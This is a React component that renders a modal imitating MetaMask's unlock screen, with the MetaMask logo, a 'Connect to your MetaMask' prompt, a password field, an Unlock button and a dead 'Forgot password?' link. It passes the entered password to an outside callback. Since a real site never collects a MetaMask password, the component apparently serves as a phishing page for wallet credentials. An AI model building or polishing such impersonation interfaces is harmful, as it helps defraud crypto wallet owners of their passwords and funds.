import React, { useState } from 'react';
import Modal from './Modal';
import Image from 'next/image';
import { motion } from 'framer-motion';

interface MetaMaskUnlockModalProps {
  isOpen: boolean;
  onClose: () => void;
  onUnlock: (password: string) => void;
}

const MetaMaskUnlockModal: React.FC<MetaMaskUnlockModalProps> = ({
  isOpen,
  onClose,
  onUnlock,
}) => {
  const [password, setPassword] = useState('');

  const handleUnlock = () => {
    onUnlock(password);
    setPassword('');
  };

  // Animation variants
  const containerVariants = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: {
        staggerChildren: 0.1
      }
    }
  } as const;

  const itemVariants = {
    hidden: { opacity: 0, y: 10 },
    show: { opacity: 1, y: 0, transition: { type: "spring" as const, stiffness: 300, damping: 24 } }
  } as const;

  return (
    <Modal isOpen={isOpen} onClose={onClose}>
      <motion.div 
        className="flex text-[13px] flex-col items-center py-4 sm:py-6 px-3 sm:px-4 space-y-4 sm:space-y-6"
        variants={containerVariants}
        initial="hidden"
        animate="show"
      >
        {/* MetaMask Logo */}
        <motion.div 
          variants={itemVariants}
          className="w-10 h-10 sm:w-12 sm:h-12"
        >
          <Image src="/assests/modal/MetaMask.png" alt="MetaMask" width={48} height={48}/>
        </motion.div>
        
        {/* Title and Text */}
        <motion.div 
          className="text-center space-y-1"
          variants={itemVariants}
        >
          <h2 className="text-[15px] sm:text-[16px] text-black font-bold">MetaMask</h2>
          <p className="text-gray-600 text-xs sm:text-sm">Connect to your MetaMask</p>
        </motion.div>
        
        {/* Password Input */}
        <motion.div 
          className="w-full"
          variants={itemVariants}
        >
        <input
  type="password"
  value={password}
  onChange={(e) => setPassword(e.target.value)}
  placeholder="Enter your password"
  className="w-full p-2 sm:p-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm placeholder-black"
/>
        </motion.div>
        
        {/* Unlock Button */}
        <motion.button
          onClick={handleUnlock}
          className="w-full py-2 sm:py-3 bg-gray-200 hover:bg-gray-300 text-gray-900 font-medium rounded-md transition-colors text-xs sm:text-sm"
          variants={itemVariants}
          whileHover={{ scale: 1.03, backgroundColor: "#e5e7eb" }}
          whileTap={{ scale: 0.97 }}
        >
          Unlock
        </motion.button>
        
        {/* Forgot Password */}
        <motion.a 
          href="#" 
          className="text-black hover:underline text-xs sm:text-sm"
          variants={itemVariants}
          whileHover={{ scale: 1.05 }}
        >
          Forgot password?
        </motion.a>
      </motion.div>
    </Modal>
  );
};

export default MetaMaskUnlockModal;
